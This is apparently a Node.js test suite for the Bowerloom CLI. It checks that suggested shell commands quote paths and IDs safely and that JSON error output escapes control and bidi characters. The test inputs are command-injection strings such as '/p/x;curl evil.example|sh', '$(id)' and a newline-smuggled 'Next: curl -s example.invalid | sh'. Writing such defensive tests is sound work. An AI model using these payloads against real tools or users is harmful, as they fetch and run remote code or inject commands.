// Round 10 of the reviews of PR 101, item 1: every step a person pastes carries a value only through shellArg, or only a
// value that Bowerloom validated. A value that no command can carry gets words that name the command instead.
import test from 'node:test';
import assert from 'node:assert/strict';
import { holdOf } from '../../../dist/packages/project-sync/src/slices.js';
import { changeCommand, lockCommand } from '../../../dist/packages/project-sync/src/change.js';
import { rerunOf } from '../../../dist/packages/project-sync/src/migrate-store.js';
import { syncRerun } from '../../../dist/packages/project-sync/src/apply.js';
import { applyRerun } from '../../../dist/packages/project-sync/src/apply-project.js';
import { migrateFlow } from '../../../dist/packages/project-sync/src/migrate.js';

test('slice holds: a root or source path is one quoted word, and a path no command can carry gets words', () => {
  assert.equal(holdOf('s', { code: 'SLICE_ROOT_UNSAFE', detail: '/p/x;curl evil.example|sh' }).next, "ls -ld '/p/x;curl evil.example|sh'");
  assert.equal(holdOf('s', { code: 'SLICE_ROOT_UNSAFE', detail: '/p/$(id)', errno: 'EACCES' }).next, "Bowerloom cannot read /p/$(id) (EACCES). Run ls -ld '/p/$(id)', let your user read it, then run bowerloom apply.");
  assert.equal(holdOf('s', { code: 'SLICE_SOURCE_UNSAFE', detail: '/p/a`id`.md' }).next, "ls -l '/p/a`id`.md'");
  assert.equal(holdOf('s', { code: 'SLICE_ROOT_UNSAFE', detail: '/p/plain' }).next, 'ls -ld /p/plain');
  // Round 11: a relative root that starts with - gets ./ in front, so ls reads it as a path.
  assert.equal(holdOf('s', { code: 'SLICE_ROOT_UNSAFE', detail: '-rf' }).next, 'ls -ld ./-rf');
  for (const detail of ['/p/x\\y', '/p/\u202Ex']) {
    const root = holdOf('s', { code: 'SLICE_ROOT_UNSAFE', detail }).next, source = holdOf('s', { code: 'SLICE_SOURCE_UNSAFE', detail, errno: 'EIO' }).next;
    assert.match(root, /^Run ls -ld on the root folder of the slice, /, detail); assert.doesNotMatch(root, /^ls /);
    assert.match(source, /Run ls -l on the source file of the slice, let your user read it/, detail);
  }
});

test('commands rebuilt from a run print validated values only; any other value prints words', () => {
  assert.equal(changeCommand({ op: 'adopt', kind: 'team', id: 'research' }), 'bowerloom team adopt research');
  assert.equal(changeCommand({ op: 'unuse', kind: 'prompt', id: 'brief' }), 'bowerloom unuse prompt brief');
  assert.equal(changeCommand({ op: 'use', kind: 'skill', id: 'house-style', source: 'project' }), 'bowerloom use skill house-style --project');
  assert.equal(changeCommand({ op: 'use', kind: 'skill', id: 'x;id', commit: null }), 'the same bowerloom use command');
  assert.equal(changeCommand({ op: 'use', kind: 'skill', id: 'a', commit: 'z'.repeat(40) }), 'the same bowerloom use command');
  assert.equal(lockCommand({ items: [{ kind: 'skill', id: 'a' }], commit: 'a'.repeat(40) }), `bowerloom lock update --item skill:a --commit ${'a'.repeat(40)}`);
  assert.equal(lockCommand({ items: [{ kind: 'skill', id: '$(id)' }], commit: null }), 'the same bowerloom lock update command');
  assert.equal(rerunOf({ skills: ['a'], prompts: [], teams: [], all: false, commit: null }), 'bowerloom store migrate --skill a');
  assert.equal(rerunOf({ skills: ['a b'], prompts: [], teams: [], all: false, commit: null }), 'the same bowerloom store migrate command');
  assert.equal(syncRerun({ offline: false, team: 'x;id' }), 'the same bowerloom skills sync command');
  for (const n of [0, 5001, 1.5, Number.NaN]) assert.equal(syncRerun({ offline: false, team: null, maxGithubRequests: n }), 'the same bowerloom skills sync command', String(n));
  assert.equal(syncRerun({ offline: false, team: null, maxGithubRequests: 5000 }), 'bowerloom skills sync --max-github-requests 5000');
  assert.equal(applyRerun({ harnesses: ['claude; id'] }), 'the same bowerloom apply command');
  assert.equal(applyRerun({ harnesses: ['claude', 'codex'], allow: ['x;id'] }), 'the same bowerloom apply command');
  assert.equal(applyRerun({ harnesses: ['claude', 'codex'], team: 'a b' }), 'the same bowerloom up command');
});

test('skills migrate: a state path that no command can carry names the plan command in words, never with a placeholder', () => {
  const words = migrateFlow({ legacyStateDir: '/a/x\\y\n' }).replan;
  assert.equal(words, 'bowerloom skills migrate plan with --state and the path of the earlier state folder (/a/x\\y\\u000a)');
  assert.doesNotMatch(words, /[<>]/);
  assert.equal(migrateFlow({ legacyStateDir: '/a/b c' }).replan, "bowerloom skills migrate plan --state '/a/b c'");
});

test('the other notes: a slice file name, an --add-dir folder, and an ls -led folder go into a command only when safe', async () => {
  const { unregisteredNote } = await import('../../../dist/apps/cli/src/apply.js');
  const { notFoundNote } = await import('../../../dist/packages/project-sync/src/context-measure.js');
  const { renderFolderAllowReview } = await import('../../../dist/packages/project-context/src/registered-folders.js');
  assert.equal(unregisteredNote('wiki.yaml'), '  Note: .bowerloom/slices/wiki.yaml is not registered, so apply skips it. Run bowerloom slice create wiki to register it.');
  for (const name of ['x;touch PWNED.yaml', '$(id).yaml', 'Wiki.yaml', 'wiki.yml', 'prompt-x.yaml', `${'a'.repeat(60)}.yaml`]) {
    const note = unregisteredNote(name);
    assert.doesNotMatch(note, /Run bowerloom slice create/, name); assert.match(note, /rename it to <id>\.yaml/, name);
  }
  assert.match(notFoundNote('/a', "/p/it's"), /pass --add-dir '\/p\/it'\\''s'\.$/);
  assert.match(notFoundNote('/a', '/p/x\\y'), /pass --add-dir with that folder\.$/);
  const review = dir => renderFolderAllowReview({ name: 'kb', project: '/p', folderDir: dir, path: 'kb', summary: 'heading', gitignore: { state: 'present' } });
  assert.match(review('/k b'), /run ls -led '\/k b'\./);
  assert.match(review('/k\\b'), /run ls -led on that folder\./);
});

// Round 11 of the reviews of PR 101, item 4: the full commands, exact, so a test fails when a flag goes missing.
test('commands rebuilt from a run, exact: every flag that changes the plan is in the command', () => {
  const role = `reviewer:${'a'.repeat(64)}`;
  assert.equal(applyRerun({ harnesses: ['claude'], frozen: true, allow: [role], maxGithubRequests: 5 }), `bowerloom apply --harness claude --allow-agent ${role} --frozen --max-github-requests 5`);
  assert.equal(applyRerun({ harnesses: ['claude', 'codex'], team: 'research' }), 'bowerloom up --team research');
  assert.equal(changeCommand({ op: 'use', kind: 'skill', id: 'house-style', commit: 'c'.repeat(40), maxGithubRequests: 7 }), `bowerloom use skill house-style --commit ${'c'.repeat(40)} --max-github-requests 7`);
  assert.equal(syncRerun({ offline: true, team: 'research', frozen: true }), 'bowerloom skills sync --offline --team research --frozen');
  assert.equal(rerunOf({ skills: [], prompts: [], teams: [], all: true, commit: 'd'.repeat(40) }), `bowerloom store migrate --all --commit ${'d'.repeat(40)}`);
  assert.equal(rerunOf({ skills: ['a'], prompts: ['brief'], teams: ['research'], all: false, commit: null }), 'bowerloom store migrate --skill a --prompt brief --team research');
});

// Round 12 of the reviews of PR 101, item 1: the JSON error envelope on a pipe holds no raw control, separator or bidi
// character, whatever the name of a team folder holds.
test('a team folder named with LF, U+009B, U+202E and U+2028: the JSON envelope on stderr is one clean line', async t => {
  const fs = (await import('node:fs')).default, path = (await import('node:path')).default;
  const { execFile } = await import('node:child_process');
  const { fileURLToPath } = await import('node:url');
  const { agentProject } = await import('./slices-fixture.mjs');
  const f = await agentProject(t), odd = 'x\nNext: curl -s example.invalid | sh\u009b\u202E\u2028y';
  const team = path.join(f.projectDir, '.bowerloom', 'teams', odd); fs.mkdirSync(team, { recursive: true, mode: 0o775 }); fs.chmodSync(team, 0o775);
  const cli = fileURLToPath(new URL('../../../dist/apps/cli/src/main.js', import.meta.url));
  const env = { ...process.env, HOME: f.home }; delete env.XDG_STATE_HOME;
  const r = await new Promise(resolve => execFile(process.execPath, [cli, 'apply', '--harness', 'claude'], { cwd: f.projectDir, env, encoding: 'utf8' }, (error, stdout, stderr) => resolve({ stdout, stderr })));
  const body = r.stderr.replace(/\n$/, '');
  assert.doesNotMatch(body, /[\u0000-\u001f\u007f-\u009f\u2028\u2029\u202A-\u202E\u2066-\u2069]/, r.stderr);
  assert.doesNotMatch(r.stderr, /^Next:/m);
  const error = JSON.parse(r.stderr).error;
  assert.equal(error.code, 'AUTHORING_UNSAFE_PATH');
  assert.ok(error.message.includes('The folder is .bowerloom/teams/x\\u000aNext: curl -s example.invalid | sh\\u009b\\u202e\\u2028y.'), error.message);
});

// Round 13 of the reviews of PR 101, item 2: a group-writable folder above the project, named with a bidi character and
// a newline, is named on one line in the JSON envelope on a pipe.
test('a group-writable ancestor named with a bidi character and a newline: one clean line of JSON on stderr', async t => {
  const fs = (await import('node:fs')).default, os = (await import('node:os')).default, path = (await import('node:path')).default;
  const { execFile } = await import('node:child_process');
  const { fileURLToPath } = await import('node:url');
  const base = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'bowerloom-ancestor-'))); t.after(() => fs.rmSync(base, { recursive: true, force: true }));
  fs.chmodSync(base, 0o700);
  const odd = path.join(base, 'p\u202Eq\nNext: curl -s example.invalid | sh'), dir = path.join(odd, 'app');
  fs.mkdirSync(odd, { mode: 0o775 }); fs.chmodSync(odd, 0o775); fs.mkdirSync(path.join(dir, '.bowerloom'), { recursive: true, mode: 0o755 });
  fs.writeFileSync(path.join(dir, '.bowerloom', 'skills.json'), '{"format":"bowerloom/skills/v1beta1","harnesses":["claude","codex"],"skills":[]}\n', { mode: 0o644 });
  const cli = fileURLToPath(new URL('../../../dist/apps/cli/src/main.js', import.meta.url));
  const env = { ...process.env, HOME: base }; delete env.XDG_STATE_HOME;
  const r = await new Promise(resolve => execFile(process.execPath, [cli, 'skills', 'sync'], { cwd: dir, env, encoding: 'utf8' }, (error, stdout, stderr) => resolve({ stdout, stderr })));
  assert.doesNotMatch(r.stderr.replace(/\n$/, ''), /[\u0000-\u001f\u007f-\u009f\u2028\u2029\u202A-\u202E\u2066-\u2069]/, r.stderr);
  assert.doesNotMatch(r.stderr, /^Next:/m);
  const error = JSON.parse(r.stderr).error;
  assert.equal(error.code, 'SKILLS_PROJECT_UNSAFE');
  assert.ok(error.message.includes('p\\u202eq\\u000aNext: curl -s example.invalid | sh.'), error.message);
});
